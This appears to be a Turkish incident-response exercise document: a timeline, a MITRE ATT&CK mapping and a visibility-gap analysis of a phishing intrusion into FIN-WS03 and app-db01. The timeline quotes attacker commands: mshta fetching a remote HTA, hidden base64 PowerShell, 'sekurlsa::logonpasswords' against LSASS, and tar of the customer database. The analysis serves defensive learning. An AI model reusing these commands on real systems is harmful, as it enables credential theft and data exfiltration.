# Case 2 - Zaman Çizelgesi ve MITRE ATT&CK Eşlemesi

**Ticket:** INC-2026-0914-07 · **Sistem:** FIN-WS03 (birincil), app-db01 (yanal hareket hedefi)

Bu dosya, ticket'ın istediği iki ayrı teslimatı bir arada derler: **zaman çizelgesi** (tüm adımların saat sırasıyla tek tabloda) ve **MITRE ATT&CK eşlemesi** (her adımın taktik + teknik ID'siyle etiketlenmesi). Kaynak: 6 log dosyası, Splunk'ta SPL ile doğrulandı.

---

## 1. Zaman Çizelgesi

| Saat (14 Eyl 2026) | Kaynak | Olay |
|---|---|---|
| 08:31 - 09:20 | mail-gateway2 | Rutin, meşru iş e-postaları (partner.com, bank.com.tr, iç duyuru) - gürültü |
| **09:12:04** | mail-gateway2 | Saldırgan altyapısından bağlantı: `connect from unknown[45.137.21.88]` |
| **09:12:05** | mail-gateway2 | Kimlik avı e-postası teslim edildi - `Fatura_2026_4471.docm` eki, **SPF fail / DKIM none** |
| **09:41:12** | sysmon2 | b.kaya, `WINWORD.EXE` ile `Fatura_2026_4471.docm`'yi açıyor |
| **09:41:18** | sysmon2 | WINWORD.EXE -> `mshta.exe http://static-cdn-analytics.com/u.hta` |
| **09:41:19** | sysmon2 | mshta.exe -> gizli, base64 kodlu `powershell.exe` |
| **09:41:24** | sysmon2 | powershell.exe -> ağ bağlantısı: `45.137.21.88:443` |
| 09:41-11:25 | dns_query2, firewall2 | ~1 dakikada bir, `static-cdn-analytics.com` (45.137.21.88) ile düzenli HTTPS beacon trafiği |
| **09:41:31** | sysmon2 | powershell.exe -> `svchost_update.exe` indirilip `%TEMP%`'e çalıştırılıyor |
| 09:51 - 10:05 | dns_query2 | 4 adet rastgele alt-alan-adlı **TXT** sorgusu (~5 dk aralıklarla), hepsi NXDOMAIN - olası DNS tünel/komut kanalı |
| **10:02:33** | mail-gateway2 | b.kaya normal iş e-postasına cevap yazıyor - kullanıcı henüz ihlalden habersiz |
| 08:22 - 09:05 | linux_secure | `ayse` kullanıcısı app-db01'e beklenen IP'den (192.168.30.15) normal giriş yapıyor - incelendi, saldırıyla ilgisi yok |
| **10:05:47** | sysmon2 | svchost_update.exe -> `m.exe "sekurlsa::logonpasswords"` çalıştırılıyor |
| **10:05:48** | sysmon2 | m.exe, `lsass.exe`'ye erişiyor (GrantedAccess=0x1410) |
| **10:31:44** | linux_secure (Case2-auth.log) | `svc-backup` hesabı **şifreyle**, **192.168.20.45'ten (FIN-WS03)** app-db01'e SSH girişi yapıyor (normalde: publickey, 192.168.30.10) |
| **10:33:02** | linux_secure | `sudo tar -czf /tmp/db_dump.tgz /var/lib/mysql/customers` - müşteri veritabanı paketleniyor |
| 10:36:20 | linux_secure | SSH oturumu kapanıyor |
| **10:38:02** | winsecurity2 | `\SystemTelemetrySync` adında zamanlanmış görev oluşturuluyor (aynı gizli PowerShell komutu) |
| **10:45:00** | winsecurity2 | Zamanlanmış görev tetikleniyor, `svchost.exe` üzerinden PowerShell tekrar çalışıyor |
| 10:40:12 | sysmon2 | b.kaya, `notepad.exe` açıyor (parametre yok) - incelendi, zararsız; kullanıcının hâlâ ihlalden habersiz normal çalıştığının bir başka işareti |
| **11:20:37** | firewall2 | **480 MB** (503.316.480 bayt) tek seferlik veri aktarımı, FIN-WS03 -> `185.220.101.44` (bilinen Tor çıkış düğümü) |
| 11:25:10 | firewall2 | 45.137.21.88 ile beacon trafiği devam ediyor |

### Not: DNS ve Firewall Arasındaki Süre Tutarsızlığı

DNS logunda `static-cdn-analytics.com` için A-kaydı sorguları **10:09:35**'te kesiliyor. Ama firewall logunda aynı IP'ye (`45.137.21.88`) giden beacon trafiği **11:25:10**'a kadar devam ediyor. Yorum: malware bir noktadan sonra DNS'i tekrar sorgulamıyor, önbelleğe alınmış IP'yi doğrudan kullanmaya devam ediyor. Bu, tek bir kaynağa bakmanın yanıltıcı olabileceğinin somut bir örneği. Sadece DNS logu incelenseydi saldırının 10:09'da bittiği sanılırdı; firewall logu gerçek süreyi (en az 11:25'e kadar) gösteriyor.

### Not: Süreç PID Zinciri Doğrulaması

WINWORD.EXE (PID 3990) -> mshta.exe (PID 4820, parent=3990) -> powershell.exe (PID 5012, parent=4820) -> svchost_update.exe (PID 5240, parent=5012) -> m.exe (PID 5990, parent=5240). Zincirde hiçbir halka eksik veya tutarsız değil. Bu, süreç ağacının uydurma değil gerçek ve kesintisiz olduğunu doğrular.

---

## 2. MITRE ATT&CK Eşlemesi

| # | Adım | Taktik | Teknik ID | Teknik Adı |
|---|---|---|---|---|
| 1 | Kimlik avı e-postasıyla `.docm` eki gönderimi | Initial Access | **T1566.001** | Phishing: Spearphishing Attachment |
| 2 | b.kaya ekli dosyayı açıyor | Execution | **T1204.002** | User Execution: Malicious File |
| 3 | Word makrosu mshta.exe'yi tetikliyor (çıkarım) | Execution | **T1059.005** | Command and Scripting Interpreter: Visual Basic |
| 4 | mshta.exe ile uzaktan içerik çalıştırma | Defense Evasion | **T1218.005** | System Binary Proxy Execution: Mshta |
| 5 | Gizli, base64 kodlu PowerShell çalıştırma | Execution | **T1059.001** | Command and Scripting Interpreter: PowerShell |
| 6 | Base64 ile komut gizleme | Defense Evasion | **T1027** | Obfuscated Files or Information |
| 7 | `svchost_update.exe` indirme ve çalıştırma | Command and Control | **T1105** | Ingress Tool Transfer |
| 8 | "svchost" ismini taklit eden dosya adı | Defense Evasion | **T1036.005** | Masquerading: Match Legitimate Name or Location |
| 9 | HTTPS üzerinden düzenli beacon (45.137.21.88) | Command and Control | **T1071.001** | Application Layer Protocol: Web Protocols |
| 10 | DNS TXT ile rastgele alt alan adı sorguları | Command and Control | **T1071.004** | Application Layer Protocol: DNS |
| 11 | `sekurlsa::logonpasswords` ile LSASS bellek erişimi | Credential Access | **T1003.001** | OS Credential Dumping: LSASS Memory |
| 12 | Çalınan `svc-backup` kimlik bilgisinin kullanımı | Defense Evasion / Persistence | **T1078** | Valid Accounts |
| 13 | Çalınan kimlikle app-db01'e SSH girişi | Lateral Movement | **T1021.004** | Remote Services: SSH |
| 14a | Müşteri veritabanı dosyalarına erişim | Collection | **T1005** | Data from Local System |
| 14b | Verinin `tar` ile paketlenmesi | Collection | **T1560.001** | Archive Collected Data: Archive via Utility |
| 15 | `\SystemTelemetrySync` zamanlanmış görevi | Persistence | **T1053.005** | Scheduled Task/Job: Scheduled Task |
| 16 | Tor çıkış düğümü üzerinden veri aktarımı | Command and Control | **T1090.003** | Proxy: Multi-hop Proxy |
| 17 | 480 MB'lık tek seferlik dışarı aktarım | Exfiltration | **T1041** | Exfiltration Over C2 Channel |

**Birincil/en kritik teknik:** T1003.001 (LSASS'tan kimlik bilgisi çalma) - bu adım, saldırının tek bir makineden kuruma yayılmasını (yanal harekete) mümkün kılan dönüm noktası.

*Not: (T1059.005) doğrudan bir makro kaydı görülmediği için çıkarımdır. WINWORD.EXE'nin doğrudan mshta.exe'yi çalıştırması, bunun bir VBA makrosu üzerinden tetiklendiğine işaret eder, ancak makro kodunun kendisi loglarda görünmüyor. Bu, raporda bir varsayım olarak belirtilmeli.*

*Not: (HTTPS beacon) için de küçük bir belirsizlik var. Sysmon'da yalnızca ilk bağlantı (09:41:24, powershell.exe, PID 5012) doğrudan bir sürece bağlanmış durumda. 09:41-11:25 arası devam eden düzenli beacon trafiğinin her tekil bağlantısı için ayrı bir süreç kaydı yok; bu trafiğin hâlâ powershell.exe'den mi yoksa 09:41:31'de başlayan svchost_update.exe'den mi geldiği, firewall logundaki zamanlama örtüşmesiyle çıkarılıyor, Sysmon'un kendisi bunu her bağlantı için ayrı ayrı doğrulamıyor.*

### Not: Case 1 ile Karşılaştırma - T1078'in Merkeziliği

Case 1'de saldırgan yeni bir hesap (`svc-update`) açmıştı (T1136.001 - Create Account). Case 2'de bunun tam tersi bir yöntem var: saldırgan yeni hesap açmadan, zaten var olan meşru bir hesabı (`svc-backup`) çalıp kullanmış. Bu yüzden bu vakada T1136 yerine **T1078 (Valid Accounts)** çok daha merkezi bir teknik. Tespit açısından bu daha sinsi bir yöntemdir. Yeni hesap açılması gibi bariz bir iz bırakmaz, sadece mevcut bir hesabın *normal dışı davranışına* (farklı kimlik doğrulama yöntemi, farklı kaynak IP) bakarak fark edilebilir.

---

## 3. Gösterge Çapraz Doğrulaması

Bugün her göstergenin birden fazla kaynakta arandığı teyit edildi:

| Gösterge | Görüldüğü kaynaklar | Aranıp bulunamadığı kaynaklar |
|---|---|---|
| `45.137.21.88` | mail-gateway2, dns_query2, firewall2, sysmon2 | winsecurity2, linux_secure (beklenen - bu IP'nin bu kaynaklarda görünmesi için bir sebep yok) |
| `static-cdn-analytics.com` | dns_query2, sysmon2 | - |
| `185.220.101.44` | firewall2 | dns_query2 (DNS çözümlemesi yok - IP'ye doğrudan bağlanılmış), diğerleri - beklenen |
| `Fatura_2026_4471.docm` | mail-gateway2, sysmon2 | - |
| `b.kaya` | sysmon2, winsecurity2, mail-gateway2 | linux_secure, dns_query2, firewall2 (beklenen - bu kullanıcı adı ağ/Linux loglarında görünmez) |
| `svc-backup` | linux_secure | sysmon2, winsecurity2, mail-gateway2, dns_query2, firewall2 (beklenen - bu hesap yalnızca app-db01'e ait) |
| `svchost_update.exe`, `m.exe` | sysmon2 | winsecurity2, linux_secure - **bu, bir görünürlük boşluğuna işaret ediyor |

**Sonuç:** Göstergelerin dağılımı beklenen sınırlar içinde (her gösterge, ait olduğu sistemin/kanalın kaynaklarında görünüyor, alakasız kaynaklarda görünmemesi de tutarlı). Tek dikkat çekici nokta: `svchost_update.exe` ve `m.exe` dosyalarının sadece Sysmon'da görünüp Windows Security logunda hiç iz bırakmaması. Bu beklenir mi yoksa bir görünürlük sınırı mı, aşağıda ele alınıyor.

---

## 4. Görünürlük Boşlukları (Visibility Gap)

Geçen haftadan kalan 6 açık sorudan hiçbiri, elimizdeki 6 kaynakla **kesinleştirilemedi**. Çünkü ihtiyaç duyulan kanıt türü bu kaynakların hiçbirinde yok. Bu bir eksiklik değil, dürüst bir tespit: aşağıdaki her madde bir **çıkarım**, bunu kesinleştirecek **kaynak** ve buna dair **öneri** ile birlikte listeleniyor.

| # | Çıkarım (kesinleşmemiş bağ) | Bunu kesinleştirecek kaynak | Öneri |
|---|---|---|---|
| 1 | 480 MB'lık aktarım, müşteri veritabanı dump'ının kendisi (zamanlama örtüşüyor ama içerik doğrulanmadı) | SSL-inceleyen bir proxy/DLP logu ya da dosya içerik denetimi yapan bir ağ cihazı | Çevre güvenlik duvarına/proxy'ye DLP (veri kaybı önleme) ve dosya parmak izi denetimi eklenmesi önerilir |
| 2 | app-db01'de ek bir kalıcılık mekanizması kurulmadı (yalnızca tek SSH oturumu gözlemlendi) | app-db01 için cron/systemd timer logu, auditd süreç logu ya da dosya bütünlüğü izleme (FIM) | app-db01'e auditd ve dosya bütünlüğü izleme kurulması, SSH log'un tek başına yetersiz kaldığı gösterildi |
| 3 | m.exe'nin LSASS'tan tam olarak hangi kimlik bilgilerini çaldığı bilinmiyor (yalnızca erişim olayı görülüyor, çıktı görülmüyor) | Uç nokta EDR/antivirüs aracının süreç çıktısı/bellek olay detayı yakalaması | FIN-WS03 ve benzeri kritik iş istasyonlarına davranış tabanlı EDR ajanı kurulması önerilir (Sysmon tek başına "ne olduğunu" gösteriyor ama "sonucunu" göstermiyor) |
| 4 | DNS TXT sorgularının alt alan adlarının gerçek anlamı/içeriği (komut mu, veri mi taşıdığı) - **daraltıldı:** 4 sorgunun da tam 30 hex karakter olması, değişken boyutlu veri taşımadığını, sabit uzunlukta bir token/kimlik taşıdığını düşündürüyor (muhtemelen check-in, veri sızdırma değil) | Tam paket yakalama (PCAP) ya da DNS güvenlik aracının sorgu içeriğini analiz etmesi | Kritik segmentlerde DNS sorgu içeriğini analiz eden bir DNS güvenlik çözümü (DNS firewall/RPZ + analiz) önerilir |
| 5 | Word makrosunun kendisi hiç görülmedi, yalnızca sonucu (mshta çağrısı) görüldü | E-posta ağ geçidinde ek sandbox/detonation analizi ya da uç noktada AMSI/script-block loglaması | Mail gateway'e ek sandbox taraması, uç noktalara AMSI tabanlı script loglaması eklenmesi önerilir |
| 6 | Saldırganın app-db01'in ötesine geçip geçmediği bilinmiyor - elimizde yalnızca 2 host'un (FIN-WS03, app-db01) logu var | Diğer olası hedef sistemlerin (ör. dosya sunucuları, diğer veritabanları) kendi logları | **En kritik boşluk:** Mevcut 6 kaynak yalnızca 2 sistemi kapsıyor; olay bu ikisinin ötesine geçmiş olsa bile bunu görebilecek hiçbir kaynağımız yok. Kurumda merkezi log toplama (SIEM'e tüm kritik sunucuların bağlanması) kapsamının genişletilmesi acilen önerilir |
| 7 | Veritabanı dump'ının (`db_dump.tgz`, app-db01'de oluşturuldu) FIN-WS03'e nasıl taşındığı tamamen görünmüyor - auth.log'da (10 satırın tamamı incelendi) app-db01'den giden bir dosya transferi kaydı yok | app-db01 üzerinde dosya transfer/ağ bağlantı logu (ör. auditd network olayları) ya da app-db01–FIN-WS03 arası iç ağ trafiğini gören bir iç segment sensörü | İç ağ segmentleri arası trafiğin de (yalnızca çevre değil) izlenmesi ve app-db01 gibi kritik sunuculara giden/gelen dosya transferlerinin loglanması önerilir |

**En öne çıkan görünürlük boşluğu (#6):** Bu vaka, iki sistemin loglarıyla sınırlı kaldı. Ama saldırganın gerçekte yalnızca bu iki sistemle sınırlı kaldığını **kanıtlayamıyoruz**. Sadece bu iki sistemin ötesini **göremiyoruz**. "Kanıt yok" ile "saldırı yok" aynı şey değil; bu ayrım, raporun öneriler bölümünde açıkça vurgulanacak.

**İkinci öne çıkan boşluk (#7):** #1 ile bağlantılı ama daha keskin bir soru: 480 MB'lık aktarım FIN-WS03'ün IP'sinden gönderildi, oysa dump app-db01'de oluşturuldu. Aradaki taşıma adımını gösteren hiçbir kayıt yok. Bu ya elimizdeki 6 kaynağın kapsamadığı bir iç ağ kanalından (SMB, iç HTTP, vb.) oldu, ya da 480 MB'lık veri bu dump'la hiç ilgisiz. İkisini ayırt edecek veri şu an elimizde yok.

---

## 5. Sonraki Adımlar

- IOC listesi tamamlandı (hash'ler, etkilenen sistemler dahil) - `Case2-IOC-Listesi.md`.
- Tam olay raporunu (özet, bulgular-kanıtlar, etki, öneriler, sonuç) bu dosyaları iskelet olarak kullanarak yazmak. Görünürlük boşlukları raporun "Öneriler" bölümüne taşınacak.
- 15 dakikalık sunumu hazırlamak.
